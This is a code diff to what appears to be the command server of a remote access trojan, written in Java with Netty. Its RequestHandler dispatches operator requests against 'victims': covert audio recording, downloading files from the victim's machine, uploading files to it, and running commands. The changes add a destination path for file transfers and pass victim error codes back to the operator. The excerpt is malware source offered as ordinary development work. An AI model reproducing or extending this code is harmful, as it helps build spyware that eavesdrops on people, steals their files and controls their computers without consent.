@@ -150,11 +150,11 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     ((AVictim) targetVictim).sendStartAudioRecord((Long) request.get("seconds"), user.getName());
                     break;
                 case "start.download.file":
-                    DownloadManager downloadManager = new DownloadManager(targetVictim, user, (String) request.get("path"));
+                    DownloadManager downloadManager = new DownloadManager(targetVictim, user, (String) request.get("path"), (String) request.get("downloadPath"));
                     downloadManager.start();
                     break;
                 case "start.upload.file":
-                    downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
+                    downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"), (String) request.get("downloadPath"));
                     downloadManager.start();
                     break;
                 case "cmd":
@@ -170,6 +170,11 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
     }
 
     private void receiveAVictimMessage(AVictim AVictim, JSONObject request) {
+        if (request.containsKey("errorCode") && request.containsKey("owner")) {
+            User targetUser = nettyServer.getUserByName((String) request.get("owner"));
+            targetUser.sendErrorCode((String) request.get("errorCode"));
+            return;
+        }
         if (!checkCorrectAVictimQuery(request)) {
             AVictim.sendErrorCode(Config.INCORRECT_QUERY);
             return;
